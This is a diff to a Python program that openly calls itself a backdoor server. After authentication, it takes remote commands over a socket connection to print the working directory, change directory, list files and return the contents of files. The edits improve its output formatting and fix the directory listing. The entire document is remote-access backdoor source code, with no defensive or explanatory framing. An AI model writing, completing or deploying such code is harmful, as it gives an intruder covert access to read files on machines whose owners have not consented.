@@ -51,7 +51,7 @@ def authenticate(message):
 # is launched and commands are interpreted
 def backdoor(connection):
     connection.send("Authentication successful, waiting for commands".encode());
-    connection.send("--help for command list".encode())
+    connection.send("--help for command list\n".encode())
 
     while True:
         # Receive command and interpret accordingly
@@ -80,9 +80,12 @@ def backdoor(connection):
             if(dualArg):
                 connection.send(requestSwitch[request[0]](request[1]).encode())
             else:
-                connection.send(requestSwitch[request]().encode())
+                toSend = requestSwitch[request]()
+                for i in toSend:
+                    i = i + "\n"
+                    connection.send(i.encode())
         except KeyError:
-            connection.send("Incorrect command, try \"help\"".encode())
+            connection.send("Incorrect command, try \"help\"\n".encode())
 
 
         # Interpret the request, call corresponding function
@@ -101,7 +104,7 @@ def cd(directory):
 
 # Lists contents of current directory
 def ls():
-    ret = os.listdir(currentDir)
+    ret = os.listdir(os.getcwd())
     return ret
 
 # Returns contents of given file
@@ -118,7 +121,7 @@ def help():
     pwd - Returns current working directory
     cd <directory> - Changes to directory <directory>
     ls - Lists the contents of the current directory
-    cat <filename> - Returns contents of <filename>"""
+    cat <filename> - Returns contents of <filename>\n\n"""
     return ret
 
 # Shuts down backdoor server
